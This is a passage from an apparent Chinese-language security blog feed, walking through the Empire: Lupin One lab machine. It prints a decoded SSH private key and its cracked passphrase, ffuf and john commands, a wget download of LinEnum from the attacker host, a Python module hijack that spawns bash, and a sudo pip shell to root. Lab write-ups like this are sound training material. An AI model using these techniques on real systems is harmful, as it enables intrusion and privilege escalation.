http://192.168.222.131/~secret</span><br><span class="hljs-string">| --&gt; | http://192.168.222.131/~secret/</span><br><span class="hljs-string">    * FUZZ: secret</span><br><span class="hljs-string"></span><br><span class="hljs-string">:: Progress: [4614/4614] :: Job [1/1] :: 3921 req/sec :: Duration: [0:00:01] :: Errors: 0 ::</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230415151438465.png" alt="image-20230415151438465"></p><p>ssh 秘钥<strong>隐藏</strong>在这个秘密目录下，找到 ssh 秘钥文件 然后使用 fasttrack 破解秘钥密码。</p><p>用户名 icex64</p><p>目录爆破字典：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/usr/share/wordlists]<br>└─<span class="hljs-comment"># wordlists</span><br><br>&gt; wordlists ~ Contains the rockyou wordlist<br><br>/usr/share/wordlists<br>├── amass -&gt; /usr/share/amass/wordlists<br>├── dirb -&gt; /usr/share/dirb/wordlists<br>├── dirbuster -&gt; /usr/share/dirbuster/wordlists<br>├── fasttrack.txt -&gt; /usr/share/set/src/fasttrack/wordlist.txt<br>├── fern-wifi -&gt; /usr/share/fern-wifi-cracker/extras/wordlists<br>├── john.lst -&gt; /usr/share/john/password.lst<br>├── legion -&gt; /usr/share/legion/wordlists<br>├── metasploit -&gt; /usr/share/metasploit-framework/data/wordlists<br>├── nmap.lst -&gt; /usr/share/nmap/nselib/data/passwords.lst<br>├── rockyou.txt.gz<br>├── sqlmap.txt -&gt; /usr/share/sqlmap/data/txt/wordlist.txt<br>├── wfuzz -&gt; /usr/share/wfuzz/wordlist<br>└── wifite.txt -&gt; /usr/share/dict/wordlist-probable.txt<br><br>┌──(root㉿kali)-[/usr/share/wordlists]<br>└─<span class="hljs-comment"># ll /usr/share/dirb/wordlists /usr/share/dirbuster/wordlists</span><br>/usr/share/dirbuster/wordlists:<br>total 7584<br>-rw-r--r-- 1 root root   71638 Feb 27  2009 apache-user-enum-1.0.txt<br>-rw-r--r-- 1 root root   90418 Feb 27  2009 apache-user-enum-2.0.txt<br>-rw-r--r-- 1 root root  546618 Feb 27  2009 directories.jbrofuzz<br>-rw-r--r-- 1 root root 1802668 Feb 27  2009 directory-list-1.0.txt<br>-rw-r--r-- 1 root root 1980043 Feb 27  2009 directory-list-2.3-medium.txt<br>-rw-r--r-- 1 root root  725439 Feb 27  2009 directory-list-2.3-small.txt<br>-rw-r--r-- 1 root root 1849676 Feb 27  2009 directory-list-lowercase-2.3-medium.txt<br>-rw-r--r-- 1 root root  676768 Feb 27  2009 directory-list-lowercase-2.3-small.txt<br><br>/usr/share/dirb/wordlists:<br>total 260<br>-rw-r--r-- 1 root root 184073 Jan 24  2012 big.txt<br>-rw-r--r-- 1 root root   1292 Jan 27  2012 catala.txt<br>-rw-r--r-- 1 root root  35849 Nov 17  2014 common.txt<br>-rw-r--r-- 1 root root   1492 May 23  2012 euskera.txt<br>-rw-r--r-- 1 root root    142 Dec 29  2005 extensions_common.txt<br>-rw-r--r-- 1 root root     75 Mar 16  2012 indexes.txt<br>-rw-r--r-- 1 root root    244 Dec 29  2005 mutations_common.txt<br>drwxr-xr-x 2 root root   4096 Mar 10 08:47 others<br>-rw-r--r-- 1 root root   6561 Mar  4  2014 small.txt<br>-rw-r--r-- 1 root root   3731 Nov 12  2014 spanish.txt<br>drwxr-xr-x 2 root root   4096 Mar 10 08:47 stress<br>drwxr-xr-x 2 root root   4096 Mar 10 08:47 vulns<br>                                                                 <br></code></pre></td></tr></table></figure><p>使用两个目录字典中最大的进行爆破：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/usr/share/wordlists]<br>└─<span class="hljs-comment"># ffuf -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://192.168.222.131/~secret/.FUZZ -e .txt -c -mc 200     </span><br><br>        /<span class="hljs-string">&#x27;___\  /&#x27;</span>___\           /<span class="hljs-string">&#x27;___\       </span><br><span class="hljs-string">       /\ \__/ /\ \__/  __  __  /\ \__/       </span><br><span class="hljs-string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      </span><br><span class="hljs-string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      </span><br><span class="hljs-string">         \ \_\   \ \_\  \ \____/  \ \_\       </span><br><span class="hljs-string">          \/_/    \/_/   \/___/    \/_/       </span><br><span class="hljs-string"></span><br><span class="hljs-string">       v2.0.0-dev</span><br><span class="hljs-string">________________________________________________</span><br><span class="hljs-string"></span><br><span class="hljs-string"> :: Method           : GET</span><br><span class="hljs-string"> :: URL              : http://192.168.222.131/~secret/.FUZZ</span><br><span class="hljs-string"> :: Wordlist         : FUZZ: /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt</span><br><span class="hljs-string"> :: Extensions       : .txt </span><br><span class="hljs-string"> :: Follow redirects : false</span><br><span class="hljs-string"> :: Calibration      : false</span><br><span class="hljs-string"> :: Timeout          : 10</span><br><span class="hljs-string"> :: Threads          : 40</span><br><span class="hljs-string"> :: Matcher          : Response status: 200</span><br><span class="hljs-string">________________________________________________</span><br><span class="hljs-string"></span><br><span class="hljs-string">...</span><br><span class="hljs-string"></span><br><span class="hljs-string">[Status: 200, Size: 4689, Words: 1, Lines: 2, Duration: 12ms]</span><br><span class="hljs-string">    * FUZZ: mysecret.txt</span><br><span class="hljs-string"></span><br><span class="hljs-string">...</span><br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230415152604264.png" alt="image-20230415152604264"></p><p>字母大小写 + 数字 可能是 base 系列</p><p>末尾没有 &#x3D; ，base58</p><p>也可以使用网站去识别编码方式：<a href="https://www.dcode.fr/cipher-identifier">https://www.dcode.fr/cipher-identifier</a></p><p><a href="https://www.lddgo.net/convert/base58">https://www.lddgo.net/convert/base58</a></p><p>解码后如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs bash">-----BEGIN OPENSSH PRIVATE KEY-----<br>b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jYmMAAAAGYmNyeXB0AAAAGAAAABDy33c2Fp<br>PBYANne4oz3usGAAAAEAAAAAEAAAIXAAAAB3NzaC1yc2EAAAADAQABAAACAQDBzHjzJcvk<br>9GXiytplgT9z/mP91NqOU9QoAwop5JNxhEfm/j5KQmdj/JB7sQ1hBotONvqaAdmsK+OYL9<br>H6NSb0jMbMc4soFrBinoLEkx894B/PqUTODesMEV/aK22UKegdwlJ9Arf+1Y48V86gkzS6<br>xzoKn/ExVkApsdimIRvGhsv4ZMmMZEkTIoTEGz7raD7QHDEXiusWl0hkh33rQZCrFsZFT7<br>J0wKgLrX2pmoMQC6o42OQJaNLBzTxCY6jU2BDQECoVuRPL7eJa0/nRfCaOrIzPfZ/NNYgu<br>/Dlf1CmbXEsCVmlD71cbPqwfWKGf3hWeEr0WdQhEuTf5OyDICwUbg0dLiKz4kcskYcDzH0<br>ZnaDsmjoYv2uLVLi19jrfnp/tVoLbKm39ImmV6Jubj6JmpHXewewKiv6z1nNE8mkHMpY5I<br>he0cLdyv316bFI8O+3y5m3gPIhUUk78C5n0VUOPSQMsx56d+B9H2bFiI2lo18mTFawa0pf<br>XdcBVXZkouX3nlZB1/Xoip71LH3kPI7U7fPsz5EyFIPWIaENsRmznbtY9ajQhbjHAjFClA<br>hzXJi4LGZ6mjaGEil+9g4U7pjtEAqYv1+3x8F+zuiZsVdMr/66Ma4e6iwPLqmtzt3UiFGb<br>4Ie1xaWQf7UnloKUyjLvMwBbb3gRYakBbQApoONhGoYQAAB1BkuFFctACNrlDxN180vczq<br>mXXs+ofdFSDieiNhKCLdSqFDsSALaXkLX8DFDpFY236qQE1poC+LJsPHJYSpZOr0cGjtWp<br>MkMcBnzD9uynCjhZ9ijaPY/vMY7mtHZNCY8SeoWAxYXToKy2cu/+pVyGQ76KYt3J0AT7wA<br>2OR3aMMk0o1LoozuyvOrB3cXMHh75zBfgQyAeeD7LyYG/b7z6zGvVxZca/g572CXxXSXlb<br>QOw/AR8ArhAP4SJRNkFoV2YRCe38WhQEp4R6k+34tK+kUoEaVAbwU+IchYyM8ZarSvHVpE<br>vFUPiANSHCZ/b+pdKQtBzTk5/VH/Jk3QPcH69EJyx8/gRE/glQY6z6nC6uoG4AkIl+gOxZ<br>0hWJJv0R1Sgrc91mBVcYwmuUPFRB5YFMHDWbYmZ0IvcZtUxRsSk2/uWDWZcW4tDskEVPft<br>rqE36ftm9eJ/nWDsZoNxZbjo4cF44PTF0WU6U0UsJW6mDclDko6XSjCK4tk8vr4qQB8OLB<br>QMbbCOEVOOOm9ru89e1a+FCKhEPP6LfwoBGCZMkqdOqUmastvCeUmht6a1z6nXTizommZy<br>x+ltg9c9xfeO8tg1xasCel1BluIhUKwGDkLCeIEsD1HYDBXb+HjmHfwzRipn/tLuNPLNjG<br>nx9LpVd7M72Fjk6lly8KUGL7z95HAtwmSgqIRlN+M5iKlB5CVafq0z59VB8vb9oMUGkCC5<br>VQRfKlzvKnPk0Ae9QyPUzADy+gCuQ2HmSkJTxM6KxoZUpDCfvn08Txt0dn7CnTrFPGIcTO<br>cNi2xzGu3wC7jpZvkncZN+qRB0ucd6vfJ04mcT03U5oq++uyXx8t6EKESa4LXccPGNhpfh<br>nEcgvi6QBMBgQ1Ph0JSnUB7jjrkjqC1q8qRNuEcWHyHgtc75JwEo5ReLdV/hZBWPD8Zefm<br>8UytFDSagEB40Ej9jbD5GoHMPBx8VJOLhQ+4/xuaairC7s9OcX4WDZeX3E0FjP9kq3QEYH<br>zcixzXCpk5KnVmxPul7vNieQ2gqBjtR9BA3PqCXPeIH0OWXYE+LRnG35W6meqqQBw8gSPw<br>n49YlYW3wxv1G3qxqaaoG23HT3dxKcssp+XqmSALaJIzYlpnH5Cmao4eBQ4jv7qxKRhspl<br>AbbL2740eXtrhk3AIWiaw1h0DRXrm2GkvbvAEewx3sXEtPnMG4YVyVAFfgI37MUDrcLO93<br>oVb4p/rHHqqPNMNwM1ns+adF7REjzFwr4/trZq0XFkrpCe5fBYH58YyfO/g8up3DMxcSSI<br>63RqSbk60Z3iYiwB8iQgortZm0UsQbzLj9i1yiKQ6OekRQaEGxuiIUA1SvZoQO9NnTo0SV<br>y7mHzzG17nK4lMJXqTxl08q26OzvdqevMX9b3GABVaH7fsYxoXF7eDsRSx83pjrcSd+t0+<br>t/YYhQ/r2z30YfqwLas7ltoJotTcmPqII28JpX/nlpkEMcuXoLDzLvCZORo7AYd8JQrtg2<br>Ays8pHGynylFMDTn13gPJTYJhLDO4H9+7dZy825mkfKnYhPnioKUFgqJK2yswQaRPLakHU<br>yviNXqtxyqKc5qYQMmlF1M+fSjExEYfXbIcBhZ7gXYwalGX7uX8vk8zO5dh9W9SbO4LxlI<br>8nSvezGJJWBGXZAZSiLkCVp08PeKxmKN2S1TzxqoW7VOnI3jBvKD3IpQXSsbTgz5WB07BU<br>mUbxCXl1NYzXHPEAP95Ik8cMB8MOyFcElTD8BXJRBX2I6zHOh+4Qa4+oVk9ZluLBxeu22r<br>VgG7l5THcjO7L4YubiXuE2P7u77obWUfeltC8wQ0jArWi26x/IUt/FP8Nq964pD7m/dPHQ<br>E8/oh4V1NTGWrDsK3AbLk/MrgROSg7Ic4BS/8IwRVuC+d2w1Pq+X+zMkblEpD49IuuIazJ<br>BHk3s6SyWUhJfD6u4C3N8zC3Jebl6ixeVM2vEJWZ2Vhcy+31qP80O/+Kk9NUWalsz+6Kt2<br>yueBXN1LLFJNRVMvVO823rzVVOY2yXw8AVZKOqDRzgvBk1AHnS7r3lfHWEh5RyNhiEIKZ+<br>wDSuOKenqc71GfvgmVOUypYTtoI527fiF/9rS3MQH2Z3l+qWMw5A1PU2BCkMso060OIE9P<br>5KfF3atxbiAVii6oKfBnRhqM2s4SpWDZd8xPafktBPMgN97TzLWM6pi0NgS+fJtJPpDRL8<br>vTGvFCHHVi4SgTB64+HTAH53uQC5qizj5t38in3LCWtPExGV3eiKbxuMxtDGwwSLT/DKcZ<br>Qb50sQsJUxKkuMyfvDQC9wyhYnH0/4m9ahgaTwzQFfyf7DbTM0+sXKrlTYdMYGNZitKeqB<br>1bsU2HpDgh3HuudIVbtXG74nZaLPTevSrZKSAOit+Qz6M2ZAuJJ5s7UElqrLliR2FAN+gB<br>ECm2RqzB3Huj8mM39RitRGtIhejpsWrDkbSzVHMhTEz4tIwHgKk01BTD34ryeel/4ORlsC<br>iUJ66WmRUN9EoVlkeCzQJwivI=<br>-----END OPENSSH PRIVATE KEY-----<br></code></pre></td></tr></table></figure><h2 id="破解秘钥"><a href="#破解秘钥" class="headerlink" title="破解秘钥"></a>破解秘钥</h2><p>先使用 ssh2john 把秘钥转换为 john 能识别的 hash ，然后再使用 john 工具和 fasttrack 字典进行密码破解</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/usr/share/wordlists]<br>└─<span class="hljs-comment"># john --wordlist=/usr/share/wordlists/fasttrack.txt </span><br>Password files required, but none specified<br>                                                                                                                                                                <br>┌──(root㉿kali)-[/usr/share/wordlists]<br>└─<span class="hljs-comment"># john --wordlist=/usr/share/wordlists/fasttrack.txt johnkey </span><br>Using default input encoding: UTF-8<br>Loaded 1 password <span class="hljs-built_in">hash</span> (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])<br>Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 <span class="hljs-keyword">for</span> all loaded hashes<br>Cost 2 (iteration count) is 16 <span class="hljs-keyword">for</span> all loaded hashes<br>Will run 4 OpenMP threads<br>Press <span class="hljs-string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="hljs-keyword">for</span> status<br>P@55w0rd!        (sshkey)     <br>1g 0:00:00:03 DONE (2023-04-15 03:32) 0.3115g/s 19.93p/s 19.93c/s 19.93C/s Winter2015..password2<br>Use the <span class="hljs-string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably<br>Session completed. <br></code></pre></td></tr></table></figure><p>P@55w0rd! </p><p>然后使用SSH秘钥进行登录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Desktop]<br>└─$ ssh -i sshkey icex64@192.168.222.131<br>The authenticity of host <span class="hljs-string">&#x27;192.168.222.131 (192.168.222.131)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ED25519 key fingerprint is SHA256:GZOCytQu/pnSRRTMvJLagwz7ZPlJMDiyabwLvxTrKME.</span><br><span class="hljs-string">This key is not known by any other names.</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>192.168.222.131<span class="hljs-string">&#x27; (ED25519) to the list of known hosts.</span><br><span class="hljs-string">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><br><span class="hljs-string">@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @</span><br><span class="hljs-string">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><br><span class="hljs-string">Permissions 0644 for &#x27;</span>sshkey<span class="hljs-string">&#x27; are too open.</span><br><span class="hljs-string">It is required that your private key files are NOT accessible by others.</span><br><span class="hljs-string">This private key will be ignored.</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230415153900719.png" alt="image-20230415153900719"></p><p>改一下权限：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Desktop]<br>└─$ ll<br>total 4<br>-rw-r--r-- 1 kali kali 3434 Apr 15 03:37 sshkey<br>                                                                                                                                                                <br>┌──(kali㉿kali)-[~/Desktop]<br>└─$ <span class="hljs-built_in">chmod</span> 600 sshkey <br>                                                                                                                                                                <br>┌──(kali㉿kali)-[~/Desktop]<br>└─$ ll              <br>total 4<br>-rw------- 1 kali kali 3434 Apr 15 03:37 sshkey<br></code></pre></td></tr></table></figure><p>再次登录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Desktop]<br>└─$ ssh -i sshkey icex64@192.168.222.131<br>Enter passphrase <span class="hljs-keyword">for</span> key <span class="hljs-string">&#x27;sshkey&#x27;</span>: <br>Linux LupinOne 5.10.0-8-amd64 <span class="hljs-comment">#1 SMP Debian 5.10.46-5 (2021-09-23) x86_64</span><br><span class="hljs-comment">########################################</span><br>Welcome to Empire: Lupin One<br><span class="hljs-comment">########################################</span><br>Last login: Sat Apr 15 01:35:02 2023 from 192.168.222.128<br>icex64@LupinOne:~$ <span class="hljs-built_in">id</span><br>uid=1001(icex64) gid=1001(icex64) <span class="hljs-built_in">groups</span>=1001(icex64)<br></code></pre></td></tr></table></figure><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>上传 LinEnum 进行信息收集：</p><p>本机开启 http 服务，靶机下载</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -m http.server<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">icex64@LupinOne:~$ <span class="hljs-built_in">cd</span> /tmp ; wget http://192.168.164.113:8000/LinEnum.sh<br>--2023-04-15 03:44:03--  http://192.168.164.113:8000/LinEnum.sh<br>Connecting to 192.168.164.113:8000... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 46631 (46K) [application/x-sh]<br>Saving to: ‘LinEnum.sh’<br><br>LinEnum.sh                              100%[===============================================================================&gt;]  45.54K  --.-KB/s    <span class="hljs-keyword">in</span> 0s      <br><br>2023-04-15 03:44:03 (151 MB/s) - ‘LinEnum.sh’ saved [46631/46631]<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">icex64@LupinOne:/tmp$ <span class="hljs-built_in">chmod</span> +x LinEnum.sh <br><br>icex64@LupinOne:/tmp$ ./LinEnum.sh &gt; icex64_info.txt<br><br>icex64@LupinOne:/tmp$ more icex64_info.txt <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">[+] We can sudo without supplying a password!<br>Matching Defaults entries <span class="hljs-keyword">for</span> icex64 on LupinOne:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User icex64 may run the following commands on LupinOne:<br>    (arsene) NOPASSWD: /usr/bin/python3.9 /home/arsene/heist.py<br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230415154822031.png" alt="image-20230415154822031"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">icex64@LupinOne:/tmp$ <span class="hljs-built_in">ls</span> -l /home/arsene/heist.py<br>-rw-r--r-- 1 arsene arsene 118 Oct  4  2021 /home/arsene/heist.py<br><br>icex64@LupinOne:/tmp$ <span class="hljs-built_in">cat</span> /home/arsene/heist.py<br>import webbrowser<br><br><span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;Its not yet ready to get in action&quot;</span>)<br><br>webbrowser.open(<span class="hljs-string">&quot;https://empirecybersecurity.co.mz&quot;</span>)<br></code></pre></td></tr></table></figure><p>无权限修改 &#x2F;home&#x2F;arsene&#x2F;heist.py，但是它导入了 webbrowser 模块，看一下这个是否允许修改。</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230415160005557.png" alt="image-20230415160005557"></p><p>找一下模块位置：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">icex64@LupinOne:/tmp$ whereis /usr/bin/python3.9<br>python3: /usr/bin/python3.9-config /usr/bin/python3 /usr/bin/python3.9 /usr/lib/python3 /usr/lib/python3.9 /etc/python3 /etc/python3.9 /usr/local/lib/python3.9 /usr/include/python3.9 /usr/share/python3 /usr/share/man/man1/python3.1.gz<br><br>icex64@LupinOne:/tmp$ find /usr/lib/python3.9 -name webbrowser.py<br>/usr/lib/python3.9/webbrowser.py<br><br>icex64@LupinOne:/tmp$ <span class="hljs-built_in">ls</span> -l /usr/lib/python3.9/webbrowser.py<br>-rwxrwxrwx 1 root root 24112 Apr 15 01:50 /usr/lib/python3.9/webbrowser.py<br></code></pre></td></tr></table></figure><p>有权限进行更改：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">vi /usr/lib/python3.9/webbrowser.py<br><br>os.system(<span class="hljs-string">&quot;/bin/bash&quot;</span>)<br></code></pre></td></tr></table></figure><p>获取 arsene 用户的 bash：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">icex64@LupinOne:/tmp$ sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py<br><br>arsene@LupinOne:/tmp$ <span class="hljs-built_in">id</span><br>uid=1000(arsene) gid=1000(arsene) <span class="hljs-built_in">groups</span>=1000(arsene),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)<br></code></pre></td></tr></table></figure><p>再来一次信息收集：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">arsene@LupinOne:/tmp$ ./LinEnum.sh &gt; arsene_info.txt<br><br>arsene@LupinOne:/tmp$ more arsene_info.txt <br></code></pre></td></tr></table></figure><p>还是这个问题：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">[+] We can sudo without supplying a password!<br>Matching Defaults entries <span class="hljs-keyword">for</span> arsene on LupinOne:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User arsene may run the following commands on LupinOne:<br>    (root) NOPASSWD: /usr/bin/pip<br><br></code></pre></td></tr></table></figure><p>sudo root 执行 &#x2F;usr&#x2F;bin&#x2F;pip</p><p><a href="https://gtfobins.github.io/">https://gtfobins.github.io</a></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230415161213520.png" alt="image-20230415161213520"></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230415161225632.png" alt="image-20230415161225632"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">arsene@LupinOne:/tmp$ TF=$(<span class="hljs-built_in">mktemp</span> -d)<br>arsene@LupinOne:/tmp$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;import os; os.execl(&#x27;/bin/sh&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;, &#x27;sh &lt;<span class="hljs-subst">$(tty)</span> &gt;<span class="hljs-subst">$(tty)</span> 2&gt;<span class="hljs-subst">$(tty)</span>&#x27;)&quot;</span> &gt; <span class="hljs-variable">$TF</span>/setup.py<br>arsene@LupinOne:/tmp$ sudo pip install <span class="hljs-variable">$TF</span><br>Processing ./tmp.Pd9QBrdUnh<br><span class="hljs-comment"># id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br><br></code></pre></td></tr></table></figure><h2 id="靶机总结"><a href="#靶机总结" class="headerlink" title="靶机总结"></a>靶机总结</h2><ol><li>ffuf 爆破目录</li><li>ssh 秘钥泄露 -&gt; ssh2john + john 破解密码</li><li>ssh -i 秘钥 uname@host 使用秘钥登录</li></ol>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
      <category>靶机渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>靶机渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Corrosion-2</title>
